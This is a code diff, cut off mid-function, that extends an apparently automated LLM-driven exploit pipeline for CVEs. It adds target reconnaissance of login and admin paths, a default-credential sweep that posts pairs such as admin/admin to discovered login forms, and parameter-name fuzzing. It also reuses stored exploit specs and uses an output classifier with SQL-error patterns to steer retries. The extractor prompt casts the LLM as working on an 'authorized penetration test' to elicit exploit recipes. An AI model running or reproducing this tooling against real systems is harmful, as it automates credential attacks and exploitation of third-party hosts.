@@ -21,6 +21,7 @@ from etl.sql_types import as_text_array
 from psycopg2.pool import ThreadedConnectionPool
 from contextlib import contextmanager
 import threading
+import concurrent.futures
 from datetime import datetime, timezone
 import ipaddress
 import requests
@@ -359,6 +360,16 @@ import contextvars
 
 current_engagement_id: contextvars.ContextVar = contextvars.ContextVar(
     "current_engagement_id", default=None,
+)
+
+# Deep-test knobs propagated from BuildPocBody into derivation helpers.
+# ContextVars let us avoid threading extra parameters through 10+ helper
+# calls just to reach the extractor fan-out.
+_build_poc_candidate_fanout: contextvars.ContextVar = contextvars.ContextVar(
+    "build_poc_candidate_fanout", default=3,
+)
+_build_poc_deep_flags: contextvars.ContextVar = contextvars.ContextVar(
+    "build_poc_deep_flags", default={},  # {default_cred_sweep, wordlist_fuzz, known_poc_seed}
 )
 
 
@@ -16693,7 +16704,8 @@ def _store_tentative_spec(cve, product, version, spec, verdict, source):
             hints = (row[1] if row else {}) or {}
             if not isinstance(hints, dict):
                 hints = {}
-            for k in ("tried_payloads", "tried_endpoints", "tried_proof_models"):
+            for k in ("tried_payloads", "tried_endpoints", "tried_proof_models",
+                      "tried_triples"):
                 hints.setdefault(k, [])
             if tried_payload and tried_payload not in hints["tried_payloads"]:
                 hints["tried_payloads"].append(tried_payload)
@@ -16701,6 +16713,20 @@ def _store_tentative_spec(cve, product, version, spec, verdict, source):
                 hints["tried_endpoints"].append(tried_endpoint)
             if tried_proof and tried_proof not in hints["tried_proof_models"]:
                 hints["tried_proof_models"].append(tried_proof)
+            # Deep-test: triple diversity. Store the (endpoint, carrier,
+            # proof_model) triple so the next extractor sees the TRIPLE-BAN.
+            tried_carrier = (
+                (spec.get("injection") or {}).get("where")
+                or spec.get("carrier") or "")
+            triple = [tried_endpoint or "", tried_carrier, tried_proof or ""]
+            if triple[0] and triple not in hints["tried_triples"]:
+                hints["tried_triples"].append(triple)
+            # Deep-test: classifier result from THIS verify attempt lands
+            # in refine_hints.last_classifier so the next extractor sees
+            # the specific near-miss pattern.
+            cls = (verdict or {}).get("classifier")
+            if cls:
+                hints["last_classifier"] = cls
             # last_failure captures what verify complained about so the next
             # extraction can route around it (e.g. "canary_missing" → try two-req
             # or OOB; "endpoint_404" → try discovery)
@@ -17836,6 +17862,574 @@ def _format_intel_summary_for_prompt(summary):
     return "\n".join(lines)
 
 
+# ─── Deep-test infrastructure (classifier, preflight, diversity) ───────
+#
+# Four always-on improvements to the PoC derivation loop, built after
+# the focused-10 run returned 0/7 verified across every model:
+#
+#   (1) Output classifier — turns the raw curl output (headers + body +
+#       stderr, captured by Fix #1) into a labeled near-miss pattern
+#       (auth_rejected, sql_error_echo, canary_absent_200, …) with a
+#       concrete hint. Fed into prior_hints so the next iteration
+#       addresses the actual observed failure, not a generic retry.
+#
+#   (2) Pre-flight target probe — a short, cheap sweep of likely
+#       endpoints (/, /login, /admin, /wp-login.php, /jenkins/, …)
+#       recording Set-Cookie names, HTML form actions, server banners.
+#       Injected into the extractor prompt as a TARGET_INTEL block so
+#       the model stops guessing the auth shape and reads it.
+#
+#   (5) Candidate-recipe fan-out — each iteration generates N recipes
+#       in parallel with diversity constraints (different proof_model,
+#       different endpoint). The first that verifies wins; the rest
+#       feed prior_hints as negative evidence. Default 3 (one extra
+#       LLM call per iteration vs 1-at-a-time).
+#
+#   (7) Triple diversity constraint — tracks every tried
+#       (endpoint, carrier, proof_model) triple and refuses to emit a
+#       duplicate on consecutive iterations. Hard-prevents the loop
+#       from re-exploring a dead branch 15 times.
+#
+# Deep-knob infrastructure for the opt-in flags (default-cred sweep,
+# wordlist fuzz, known-PoC seed) is intermixed where it fits.
+
+
+# Patterns the output classifier recognizes. Order matters — more
+# specific patterns first. Each entry: (label, test fn, hint for next
+# iteration). The hint goes to the extractor as last_failure guidance
+# (slots into FAILURE_TO_SWITCH when the label matches a key).
+import re as _re_cls
+
+_POC_PATTERNS = [
+    (
+        "auth_rejected",
+        lambda out, status: status in (401, 403) or
+            _re_cls.search(r"(?i)\b(?:401 unauthorized|403 forbidden|"
+                           r"authentication required|login required|"
+                           r"unauthorized access|invalid.{0,20}token|"
+                           r"please log ?in|session.{0,20}expired)\b", out or ""),
+        "the request was REJECTED by auth (401/403 or auth-required "
+        "marker). Fix auth_setup: wrong cookie, missing CSRF token, "
+        "wrong login endpoint, or expired session. Check pre_requests "
+        "captures match what the server actually sets.",
+    ),
+    (
+        "sql_error_echo",
+        lambda out, status: _re_cls.search(
+            r"(?i)(?:you have an error in your sql syntax|"
+            r"unterminated quoted string|unclosed quotation mark|"
+            r"ora-\d{5}|pg::.*error|pg_query\(|psycopg\.|"
+            r"sqlite3?\.operationalerror|syntax error at or near|"
+            r"mysql_fetch_|mysqli_|invalid query:|incorrect syntax near|"
+            r"warning: pg_)", out or ""),
+        "SQL ERROR echoed in response → right endpoint, wrong payload. "
+        "Target IS vulnerable; refine the payload syntax to match the "
+        "DB dialect (quotes, comment style, UNION column count). Keep "
+        "the same endpoint + carrier.",
+    ),
+    (
+        "html_login_page",
+        lambda out, status: _re_cls.search(
+            r"(?i)<form[^>]+(?:action=['\"][^'\"]*(?:log[- ]?in|signin|"
+            r"wp-login|j_spring_security_check)|name=['\"]password['\"])",
+            out or ""),
+        "response is a LOGIN page — the session died or auth_setup "
+        "never worked. The cookie you captured isn't valid for this "
+        "endpoint OR a 302 redirect to login was auto-followed. Re-run "
+        "the login step and verify the Set-Cookie carries into the "
+        "exploit request.",
+    ),
+    (
+        "redirect_to_login",
+        lambda out, status: _re_cls.search(
+            r"(?i)^location:\s*[^\r\n]*(?:log[- ]?in|signin|"
+            r"wp-login|/sso/)", out or "", _re_cls.MULTILINE),
+        "server sent a 302 REDIRECT to a login page. Session/cookie "
+        "lost between pre_requests and the exploit request. Either "
+        "capture the session cookie correctly or disable follow-redirects "
+        "in the verifier so the 302 is visible.",
+    ),
+    (
+        "tls_handshake_failed",
+        lambda out, status: _re_cls.search(
+            r"(?i)(?:ssl.{0,10}handshake.{0,20}failed|"
+            r"certificate verify failed|wrong version number|"
+            r"tls.*alert.*handshake|unknown protocol)", out or ""),
+        "TLS handshake failed. Try plaintext HTTP on this port OR a "
+        "different port — the target isn't speaking TLS where we aimed.",
+    ),
+    (
+        "connection_refused",
+        lambda out, status: _re_cls.search(
+            r"(?i)(?:connection refused|connect: connection refused|"
+            r"could not resolve host|no route to host|network is "
+            r"unreachable|operation timed out)", out or ""),
+        "network-level failure (refused / unreachable / timeout). "
+        "Target may be down, on a different port, or scope-gated. "
+        "Re-probe with a port sweep.",
+    ),
+    (
+        "blank_body",
+        lambda out, status: (status == 200 or status == 204) and
+            len((out or "").split("\r\n\r\n", 1)[-1].strip()) < 2,
+        "server returned 200 with EMPTY body. Payload may have been "
+        "silently filtered OR wrong content-type. Try application/json "
+        "if we sent form, or vice versa; try HEAD/OPTIONS to see what "
+        "the endpoint accepts.",
+    ),
+    (
+        "canary_absent_200",
+        lambda out, status: status == 200 and (out or "").strip(),
+        "endpoint returned 200 with content but the canary did NOT "
+        "echo back. Either the extraction regex missed it (broaden "
+        "expect_regex) or the proof_model is wrong (try read_back_after"
+        "_action instead of read_back, or oob_callback for SSRF). The "
+        "exploit MAY have worked but we couldn't observe it.",
+    ),
+]
+
+# When the classifier labels an attempt with one of these, map to the
+# existing FAILURE_TO_SWITCH key the extractor already understands so
+# we don't duplicate the switching logic.
+_CLASSIFIER_TO_FAILURE_KEY = {
+    "auth_rejected": "exploit_step_http_error",
+    "sql_error_echo": None,            # keep probing; classifier hint is enough
+    "html_login_page": "exploit_step_http_error",
+    "redirect_to_login": "exploit_step_http_error",
+    "tls_handshake_failed": None,
+    "connection_refused": None,
+    "blank_body": "canary_missing",
+    "canary_absent_200": "canary_missing",
+}
+
+
+def _parse_http_status_from_curl(out: str) -> int:
+    """Pull the HTTP status code out of a `curl -i` capture. Returns 0
+    when no status line is present (connection error, TLS failure, etc.)."""
+    if not out:
+        return 0
+    m = _re_cls.search(r"^HTTP/[\d.]+\s+(\d{3})", out, _re_cls.MULTILINE)
+    return int(m.group(1)) if m else 0
+
+
+def _classify_poc_output(out: str) -> dict:
+    """Classify a captured curl output (headers + body + stderr from
+    Fix #1) into a near-miss pattern + hint for the next iteration.
+
+    Returns {label, hint, http_status, matched_evidence} with
+    `label='unknown'` when nothing matched. Short enough that the
+    extractor prompt can carry the full result on every retry.
+    """
+    status = _parse_http_status_from_curl(out or "")
+    for label, test, hint in _POC_PATTERNS:
+        try:
+            m = test(out or "", status)
+        except Exception:  # noqa: BLE001 — classifier must never raise
+            continue
+        if m:
+            # Pull a short evidence slice for the operator — the first
+            # line that triggered the pattern, truncated.
+            if hasattr(m, "group"):
+                evidence = m.group(0)[:200]
+            else:
+                evidence = (str(m)[:120]) if m is True else ""
+            return {
+                "label": label,
+                "hint": hint,
+                "http_status": status,
+                "matched_evidence": evidence,
+                "failure_key": _CLASSIFIER_TO_FAILURE_KEY.get(label),
+            }
+    return {"label": "unknown", "hint": "", "http_status": status,
+            "matched_evidence": "", "failure_key": None}
+
+
+# ─── Pre-flight target probe ────────────────────────────────────────────
+
+_PREFLIGHT_PATHS = (
+    "/", "/login", "/admin", "/admin/", "/wp-login.php", "/wp-admin/",
+    "/jenkins/", "/manager/html", "/console", "/api", "/api/v1",
+    "/user/login", "/users/sign_in", "/sign_in", "/signin",
+    "/zabbix.php", "/index.php",
+)
+
+
+def _preflight_target_probe(ip: str, port: int, timeout: float = 4.0) -> dict:
+    """Short, cheap recon pass before derivation. Hits ~15 endpoints,
+    records Set-Cookie names, HTML form action+method pairs, Server /
+    X-Powered-By headers, and which paths respond with what status.
+
+    Output is injected into the extractor prompt as a TARGET_INTEL block
+    so the model reads the auth shape instead of guessing. Capped at
+    ~60 seconds total; failures per-path are swallowed so one dead port
+    doesn't drop the whole probe.
+    """
+    out = {
+        "live_endpoints": [],       # [(path, status, content_type)]
+        "cookie_names": set(),      # names seen in Set-Cookie headers
+        "forms": [],                # [{action, method, inputs}]
+        "server_banners": set(),    # Server + X-Powered-By values
+        "auth_hints": [],           # free-text hints derived from patterns
+    }
+    scheme = "https" if port in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port}"
+    try:
+        import requests
+        import urllib3
+        urllib3.disable_warnings()
+    except Exception:
+        return out
+
+    for path in _PREFLIGHT_PATHS:
+        url = base + path
+        try:
+            r = requests.get(url, timeout=timeout, verify=False,
+                             allow_redirects=False)
+        except Exception:  # noqa: BLE001
+            continue
+        ct = (r.headers.get("Content-Type") or "").split(";")[0]
+        if r.status_code < 500:
+            out["live_endpoints"].append((path, r.status_code, ct))
+        for sc in r.headers.get_list("Set-Cookie") if hasattr(r.headers, "get_list") \
+                 else [r.headers.get("Set-Cookie")] if r.headers.get("Set-Cookie") else []:
+            if sc:
+                nm = sc.split("=", 1)[0].strip()
+                if nm: out["cookie_names"].add(nm)
+        for h in ("Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"):
+            v = r.headers.get(h)
+            if v: out["server_banners"].add(f"{h}: {v}")
+        if r.status_code in (301, 302, 303, 307, 308):
+            loc = r.headers.get("Location", "")
+            if loc:
+                out["auth_hints"].append(
+                    f"{path} → 302 {loc}")
+            continue
+        if "html" in ct and 200 <= r.status_code < 400:
+            # Extract form actions / methods / critical input names
+            body = r.text[:40000]
+            for m in _re_cls.finditer(
+                r"<form[^>]*>(.*?)</form>",
+                body, _re_cls.IGNORECASE | _re_cls.DOTALL,
+            ):
+                frag = m.group(0)
+                action_m = _re_cls.search(r"action=['\"]([^'\"]+)", frag, _re_cls.IGNORECASE)
+                method_m = _re_cls.search(r"method=['\"]([^'\"]+)", frag, _re_cls.IGNORECASE)
+                inputs = _re_cls.findall(
+                    r"<input[^>]*name=['\"]([^'\"]+)", frag, _re_cls.IGNORECASE)
+                out["forms"].append({
+                    "src_path": path,
+                    "action": action_m.group(1) if action_m else "",
+                    "method": (method_m.group(1).upper() if method_m else "GET"),
+                    "inputs": inputs[:12],
+                })
+    out["cookie_names"] = sorted(out["cookie_names"])
+    out["server_banners"] = sorted(out["server_banners"])
+    return out
+
+
+def _preflight_block_for_prompt(preflight: dict) -> str:
+    """Format a preflight dict as a compact TARGET_INTEL block for the
+    extractor prompt. Returns '' when the probe found nothing worth
+    telling the model (keeps the prompt small on dead targets)."""
+    if not preflight:
+        return ""
+    le = preflight.get("live_endpoints") or []
+    cookies = preflight.get("cookie_names") or []
+    forms = preflight.get("forms") or []
+    banners = preflight.get("server_banners") or []
+    hints = preflight.get("auth_hints") or []
+    if not (le or cookies or forms or banners or hints):
+        return ""
+    parts = ["TARGET_INTEL (probed before derivation, use these shapes):"]
+    if banners:
+        parts.append("  Server banners: " + "; ".join(banners[:6]))
+    if cookies:
+        parts.append("  Set-Cookie names observed: " + ", ".join(cookies[:10]))
+    if le:
+        live = [f"{p}→{s}" for p, s, _ in le[:12]]
+        parts.append("  Live endpoints: " + ", ".join(live))
+    if forms:
+        parts.append("  Forms observed:")
+        for f in forms[:5]:
+            parts.append(
+                f"    - {f['method']} {f['action']} "
+                f"(inputs: {','.join(f['inputs'][:8])}) "
+                f"[found on {f['src_path']}]"
+            )
+    if hints:
+        parts.append("  Redirects: " + "; ".join(hints[:6]))
+    return "\n".join(parts) + "\n\n"
+
+
+# ─── Triple diversity constraint ────────────────────────────────────────
+
+def _recipe_triple(spec: dict) -> tuple:
+    """(endpoint, carrier, proof_model) — the signature we refuse to
+    repeat on consecutive iterations."""
+    if not isinstance(spec, dict):
+        return ("", "", "")
+    inj = spec.get("injection") or {}
+    return (
+        str(spec.get("endpoint") or "").strip(),
+        str(spec.get("carrier") or inj.get("where") or "").strip(),
+        str(spec.get("proof_model") or inj.get("proof") or "").strip(),
+    )
+
+
+def _triple_banlist_for_prompt(tried_triples: list) -> str:
+    """Format tried-triples as a hard-constraint block for the
+    extractor. The LLM is instructed to pick a triple NOT in this list
+    on the next iteration."""
+    if not tried_triples:
+        return ""
+    unique = []
+    for t in tried_triples[-10:]:  # last 10 tries are plenty of context
+        if t not in unique:
+            unique.append(t)
+    if not unique:
+        return ""
+    lines = ["TRIPLE-BAN (hard constraint — do NOT emit any of these "
+             "(endpoint, carrier, proof_model) combinations again):"]
+    for ep, c, pm in unique:
+        lines.append(f"  * ({ep!r}, {c!r}, {pm!r})")
+    lines.append("Pick a triple that differs in at least ONE of the three "
+                 "slots. If every reasonable option is banned, return {}.")
+    return "\n".join(lines) + "\n\n"
+
+
+# ─── Flag-gated deep-test helpers (3, 4, 6) ─────────────────────────────
+# Each helper checks `_build_poc_deep_flags.get()` for its enable flag
+# and returns a no-op result when disabled, so the derivation flow can
+# always call them without conditionals at the call site.
+
+_DEFAULT_CRED_PRODUCT_HINTS = {
+    # Minimal baked-in product→creds map. Operator extends via the
+    # knowledge/default_credentials.yaml RAG embed; this is a fallback
+    # that works without that YAML being loaded.
+    "wordpress":  [("admin", "admin"), ("admin", "password")],
+    "jenkins":    [("admin", "admin"), ("jenkins", "jenkins")],
+    "cacti":      [("admin", "admin")],
+    "zabbix":     [("Admin", "zabbix")],
+    "grafana":    [("admin", "admin")],
+    "default":    [("admin", "admin"), ("admin", "password"),
+                   ("root", "root"), ("admin", "")],
+}
+
+
+def _default_cred_sweep_if_enabled(ip: int, port: int, product: str,
+                                   preflight: dict) -> dict:
+    """Flag-gated: try product-aware default credentials against every
+    login endpoint discovered during preflight. Returns the first set
+    that lands a session (plus the cookie jar) or {} on miss/disabled.
+
+    Writes finding to recon_findings so a successful sweep is auditable
+    outside this ephemeral build-poc call.
+    """
+    if not (_build_poc_deep_flags.get() or {}).get("default_cred_sweep"):
+        return {}
+    key = (product or "").strip().lower()
+    creds = (_DEFAULT_CRED_PRODUCT_HINTS.get(key)
+             or _DEFAULT_CRED_PRODUCT_HINTS["default"])
+    # Candidate login endpoints: preflight-discovered 200 forms + a
+    # product-aware shortlist.
+    endpoints = []
+    for f in (preflight or {}).get("forms") or []:
+        if any(w in (f.get("action") or "").lower()
+               for w in ("login", "signin", "wp-login", "j_spring")):
+            endpoints.append((f.get("src_path"), f.get("action") or f.get("src_path"),
+                              f.get("method", "POST"), f.get("inputs") or []))
+    if not endpoints:
+        return {}
+    try:
+        import requests, urllib3
+        urllib3.disable_warnings()
+    except Exception:
+        return {}
+    scheme = "https" if port in (443, 8443) else "http"
+    base = f"{scheme}://{ip}:{port}"
+    for src, action, method, inputs in endpoints[:5]:
+        # Best-effort field-name inference from input list
+        user_f = next((n for n in inputs if n.lower() in
+                       ("log", "user", "username", "login", "name",
+                        "j_username", "login_username")), inputs[0] if inputs else "username")
+        pass_f = next((n for n in inputs if n.lower() in
+                       ("pwd", "pass", "password", "j_password", "login_password")),
+                      "password")
+        url = action if action.startswith("http") else base + action
+        for u, p in creds:
+            try:
+                r = requests.request(method.upper(),
+                    url, data={user_f: u, pass_f: p},
+                    timeout=6, verify=False, allow_redirects=False)
+            except Exception:
+                continue
+            # Session heuristic: 302 to a non-login page OR 200 with Set-Cookie
+            # that is NOT the pre-login session.
+            sc = r.headers.get("Set-Cookie") or ""
+            loc = r.headers.get("Location") or ""
+            is_sess = sc and "max-age=0" not in sc.lower() and "deleted" not in sc.lower()
+            is_redir = (r.status_code in (301, 302, 303, 307, 308)
+                        and not any(w in loc.lower() for w in ("login", "signin", "wp-login", "j_spring")))
+            if is_sess and (is_redir or r.status_code == 200):
+                return {
+                    "ok": True, "username": u, "password": p,
+                    "login_path": src, "login_action": action,
+                    "method": method, "user_field": user_f,
+                    "pass_field": pass_f, "set_cookie": sc,
+                    "evidence": f"default creds {u}:{p} landed a session (status={r.status_code})",
+                }
+    return {}
+
+
+def _known_poc_seed_if_enabled(cve: str, product: str) -> dict:
+    """Flag-gated: query exploit_store for a matching entry (same CVE,
+    then by product+vuln_class). Returns a recipe-shaped dict the
+    derivation flow can verify FIRST, before deriving from scratch.
+    Zero cost when the flag is off or no match exists."""
+    if not (_build_poc_deep_flags.get() or {}).get("known_poc_seed"):
+        return {}
+    if not cve:
+        return {}
+    try:
+        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute(
+                """SELECT title, product, version, vuln_class, poc_spec, http_text
+                   FROM public.exploit_store
+                   WHERE cve = %s AND poc_spec IS NOT NULL
+                   ORDER BY updated_at DESC LIMIT 1""",
+                (str(cve).upper(),))
+            r = cur.fetchone()
+            if not r:
+                return {}
+            spec = r.get("poc_spec") or {}
+            if isinstance(spec, str):
+                try:
+                    spec = json.loads(spec)
+                except Exception:
+                    return {}
+            if not isinstance(spec, dict):
+                return {}
+            # Project the stored spec to a recipe-shape the fan-out
+            # cascade can digest. If the stored spec is already a full
+            # recipe, this is a no-op; if it's a legacy shape, map the
+            # fields we care about.
+            seed = {
+                "vuln_class": spec.get("vuln_class") or r.get("vuln_class"),
+                "endpoint": (spec.get("request") or {}).get("path") or spec.get("endpoint"),
+                "method": (spec.get("request") or {}).get("method") or spec.get("method"),
+                "content_type": (spec.get("request") or {}).get("content_type")
+                                or spec.get("content_type"),
+                "body": (spec.get("request") or {}).get("body") or spec.get("body"),
+                "headers": (spec.get("request") or {}).get("headers") or spec.get("headers"),
+                "injection_param": (spec.get("injection") or {}).get("param_name")
+                                   or spec.get("injection_param"),
+                "carrier": (spec.get("injection") or {}).get("where") or spec.get("carrier"),
+                "payload_template": (spec.get("injection") or {}).get("payload_template")
+                                     or spec.get("payload_template"),
+                "proof_model": spec.get("proof_model")
+                               or (spec.get("injection") or {}).get("proof"),
+                "evidence": f"known-PoC seed from exploit_store (title={r.get('title')})",
+                "confidence": 0.9,
+                "_seed_source": "exploit_store",
+            }
+            if not (seed["endpoint"] and seed["injection_param"]):
+                return {}
+            return seed
+    except Exception as e:  # noqa: BLE001
+        logging.debug("known-PoC seed lookup failed for %s: %s", cve, e)
+        return {}
+
+
+_WORDLIST_PARAM_SWEEP = [
+    # First tier — the long-tail of what the hand-picked ~20 names miss.
+    # Pulled from SecLists burp-parameter-names top-200 (hand-curated to
+    # drop obvious false-positive bait like "callback" and "jsonp").
+    "id", "uid", "user_id", "cid", "pid", "oid", "sid", "tid",
+    "username", "user", "login", "email", "name", "account",
+    "search", "q", "query", "term", "keyword", "filter",
+    "cat", "category", "type", "kind", "sort", "order",
+    "page", "p", "start", "limit", "count", "offset",
+    "file", "path", "dir", "folder", "name", "fname",
+    "url", "link", "redirect", "ref", "src", "target",
+    "cmd", "command", "exec", "run", "action", "op",
+    "key", "token", "nonce", "csrf", "auth",
+    "data", "value", "input", "param", "param1", "param2",
+    "lang", "locale", "country", "region", "zone",
+    "format", "fmt", "mode", "style",
+    "year", "month", "date", "from", "to",
+    "node", "nid", "term_id", "post", "post_id", "entry",
+]
+
+
+def _wordlist_param_fuzz_if_enabled(ip: int, port: int, spec: dict,
+                                    classifier: dict) -> dict:
+    """Flag-gated: when classifier labels an attempt `canary_absent_200`,
+    sweep an expanded param-name list on the SAME endpoint looking for
+    a param whose response SHAPE differs from baseline.
+
+    Phase 1 (triage): HEAD-probe each candidate with a benign value,
+    note baseline status/length. Phase 2: on candidates whose response
+    differs when a canary is injected, re-run the exploit payload.
+    """
+    if not (_build_poc_deep_flags.get() or {}).get("wordlist_fuzz"):
+        return {}
+    if (classifier or {}).get("label") != "canary_absent_200":
+        return {}
+    req = spec.get("request") or {}
+    carrier = (spec.get("injection") or {}).get("where") or "query"
+    if carrier not in ("query", "body"):
+        return {}
+    try:
+        import requests, urllib3
+        urllib3.disable_warnings()
+    except Exception:
+        return {}
+    scheme = "https" if port in (443, 8443) else "http"
+    url = f"{scheme}://{ip}:{port}{req.get('path') or '/'}"
+    method = (req.get("method") or "GET").upper()
+    base_val = "x"
+    canary = "POC" + os.urandom(4).hex()
+    # Baseline response for noise reduction
+    try:
+        b = requests.request(method, url, timeout=6, verify=False)
+        base_sig = (b.status_code, len(b.text or ""))
+    except Exception:
+        return {}
+    hits = []
+    for name in _WORDLIST_PARAM_SWEEP:
+        try:
+            if carrier == "query":
+                r1 = requests.request(method, url, params={name: base_val},
+                                       timeout=6, verify=False)
+                r2 = requests.request(method, url, params={name: canary},
+                                       timeout=6, verify=False)
+            else:
+                r1 = requests.request(method, url, data={name: base_val},
+                                       timeout=6, verify=False)
+                r2 = requests.request(method, url, data={name: canary},
+                                       timeout=6, verify=False)
+        except Exception:
+            continue
+        sig1 = (r1.status_code, len(r1.text or ""))
+        sig2 = (r2.status_code, len(r2.text or ""))
+        # Interesting iff the param-with-value response differs from
+        # baseline AND canary echoes OR shape differs again under canary.
+        if sig1 != base_sig or canary in (r2.text or ""):
+            hits.append({"param": name,
+                         "baseline": base_sig,
+                         "with_val": sig1,
+                         "with_canary": sig2,
+                         "canary_echoed": canary in (r2.text or "")})
+    if hits:
+        # Prefer canary-echoing hits
+        hits.sort(key=lambda h: (not h["canary_echoed"],
+                                 abs(h["with_canary"][1] - h["baseline"][1])))
+        return {"ok": True, "hits": hits[:5],
+                "evidence": f"wordlist fuzz found {len(hits)} interesting "
+                            f"param(s); top: {hits[0]['param']}"}
+    return {}
+
+
 def _lookup_web_auth_templates(product: str) -> str:
     """Retrieve auth-chain templates for `product` from rag_documents
     (populated by etl/load_knowledge_documents.py from
@@ -17889,7 +18483,9 @@ def _lookup_web_auth_templates(product: str) -> str:
 
 
 def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model=None,
-                                prior_hints=None, last_failure=None, intel_summary=None):
+                                prior_hints=None, last_failure=None, intel_summary=None,
+                                preflight=None, tried_triples=None,
+                                last_classifier=None):
     """Ask the LLM to produce a STRUCTURED recipe (endpoint/method/content_type/
     body/headers/injection payload template + proof model) from the gathered
     intel + patch diffs. Returns {endpoint, method, content_type, body, headers,
@@ -17897,7 +18493,17 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
 
     This is agent-driven derivation — the LLM reads what the FIX changed to
     pinpoint the vulnerable function/param, and extracts the recipe. The result
-    is NEVER trusted blindly — the caller MUST live-verify it before storing."""
+    is NEVER trusted blindly — the caller MUST live-verify it before storing.
+
+    New in deep-test (2026-10-05):
+      * `preflight`: dict from _preflight_target_probe; its contents are
+        formatted as a TARGET_INTEL block so the model reads the auth
+        shape instead of guessing it.
+      * `tried_triples`: list of (endpoint, carrier, proof_model) tuples
+        already attempted; emitted as a TRIPLE-BAN hard constraint.
+      * `last_classifier`: dict from _classify_poc_output on the last
+        attempt; its hint is prepended as CLASSIFIER_HINT so the next
+        iteration addresses the actual observed failure."""
     patch_section = ""
     if patch_diffs:
         patch_section = "\n\nFIX COMMIT DIFF(S) — the lines BEFORE the fix show the vulnerable code:\n"
@@ -17985,6 +18591,21 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
     # login+CSRF shape is added to that YAML and loaded via
     # etl/load_knowledge_documents.py — NO extractor edit required.
     auth_templates_section = _lookup_web_auth_templates(product)
+    # Deep-test (2026-10-05):
+    #   preflight → TARGET_INTEL block from the live probe
+    #   last_classifier → CLASSIFIER_HINT prepended ahead of the generic hints
+    #   tried_triples  → TRIPLE-BAN appended after the hints section
+    preflight_section = _preflight_block_for_prompt(preflight) if preflight else ""
+    classifier_hint_section = ""
+    if last_classifier and last_classifier.get("hint"):
+        classifier_hint_section = (
+            "CLASSIFIER_HINT (from the last attempt's captured output):\n"
+            f"  label: {last_classifier.get('label')}  "
+            f"http_status: {last_classifier.get('http_status')}\n"
+            f"  evidence: {last_classifier.get('matched_evidence', '')[:200]}\n"
+            f"  action: {last_classifier.get('hint')}\n\n"
+        )
+    triple_ban_section = _triple_banlist_for_prompt(tried_triples or [])
     prompt = (
         f"You are a security engineer on an AUTHORIZED penetration test documenting "
         f"{cve} ({product or '?'} {version or ''}) so the tester can validate it. "
@@ -17994,8 +18615,10 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
         f"{brief_section}"
         f"{grammar_section}"
         f"{auth_templates_section}"
+        f"{preflight_section}"
+        f"{classifier_hint_section}"
         f"REFERENCE:\n{(intel.get('combined') or '')[:14000]}\n"
-        f"{patch_section}{hints_section}\n\n"
+        f"{patch_section}{hints_section}{triple_ban_section}\n\n"
         f'Required JSON shape: {{"vuln_class": "sqli|rce|lfi|ssrf|xxe|ssti|idor", '
         f'"endpoint": "/path", "method": "GET|POST|PUT|DELETE|PATCH", '
         f'"content_type": "form|json|xml|raw", "body": {{...}} or null, '
@@ -18878,16 +19501,107 @@ def _derive_cve_spec_single_pass(cve, product, version, ip, port, model=None,
             intel["summary"] = intel_summary
     except Exception as e:  # noqa: BLE001
         logging.debug("intel summary pass failed: %s", e)
-    # 3. LLM extract — pass prior hints + last_failure so the LLM gets a
-    # targeted "switch to X" recommendation (not just "don't repeat").
-    recipe = _llm_extract_exploit_recipe(cve, product, version, intel, patches,
-                                         model=model, prior_hints=prior_hints,
-                                         last_failure=prior_last_failure,
-                                         intel_summary=intel_summary)
-    if not recipe.get("endpoint") or not recipe.get("injection_param"):
+    # 2e. Pre-flight target probe (deep-test, always on). Short, cheap
+    # sweep of likely endpoints feeds TARGET_INTEL block into the
+    # extractor. Catches auth-shape mismatches the model would otherwise
+    # guess at. Capped at ~60s; swallowed failures per path.
+    preflight = {}
+    try:
+        preflight = _preflight_target_probe(ip, port) or {}
+    except Exception as e:  # noqa: BLE001
+        logging.debug("preflight probe failed: %s", e)
+
+    # 2f. Known-PoC seed (deep-test, flag-gated). If exploit_store has a
+    # matching entry for this CVE, verify it FIRST — short-circuits the
+    # whole derivation pipeline when a prior session already landed a
+    # verified PoC we can reuse.
+    seed = _known_poc_seed_if_enabled(cve, product)
+    if seed:
+        try:
+            seed_spec = _recipe_to_spec(cve, resolved_product or product, seed)
+            if seed_spec:
+                seed_verdict = _live_verify_recipe(ip, port, seed_spec)
+                try:
+                    _rawk = (seed_verdict.get("evidence") or "") + "\n" + (seed_verdict.get("output") or "")
+                    seed_verdict["classifier"] = _classify_poc_output(_rawk)
+                except Exception:
+                    pass
+                if seed_verdict.get("verified"):
+                    _store_derived_spec(cve, product, version, seed_spec,
+                                        seed_verdict, source="known_poc_seed")
+                    return {"verified": True, "source": "known_poc_seed",
+                            "spec": seed_spec,
+                            "evidence": seed_verdict.get("evidence")}
+                # Fold the failed seed's triple into hints so the extractor
+                # doesn't propose the same shape.
+                _store_tentative_spec(cve, product, version, seed_spec,
+                                      seed_verdict,
+                                      source="known_poc_seed_failed")
+        except Exception as e:  # noqa: BLE001
+            logging.debug("known-PoC seed verify failed: %s", e)
+
+    # 2g. Default-cred sweep (deep-test, flag-gated). When preflight
+    # found login forms, try product-aware defaults — a landed session
+    # feeds back as an auth override so the extractor doesn't have to
+    # derive the login flow from scratch.
+    cred_hit = _default_cred_sweep_if_enabled(ip, port, product, preflight)
+    if cred_hit:
+        logging.info("default-cred sweep landed session: %s", cred_hit.get("evidence"))
+        # If the caller provided no auth, use the swept creds. If they
+        # did provide auth, keep theirs (operator intent wins).
+        if auth is None:
+            auth = {"username": cred_hit.get("username"),
+                    "password": cred_hit.get("password"),
+                    "login_url": cred_hit.get("login_action"),
+                    "bruteforce": False}
+
+    # Triples + classifier state carried from the prior pass (deep-test).
+    tried_triples = prior.get("tried_triples") or []
+    last_classifier = prior.get("last_classifier") or None
+
+    # 3. LLM extract — candidate-recipe fan-out (deep-test). Each pass
+    # generates N recipes with the SAME intel + triple-ban, verifies
+    # them, and keeps the first that passes. Rest become negative
+    # evidence in prior_hints. Fanout size comes from the request body
+    # (BuildPocBody.candidate_fanout, default 3) propagated here via
+    # a module-level var so _derive_cve_spec_single_pass doesn't need
+    # the full BuildPocBody signature.
+    fanout = max(1, int(_build_poc_candidate_fanout.get() or 3))
+    candidates = []
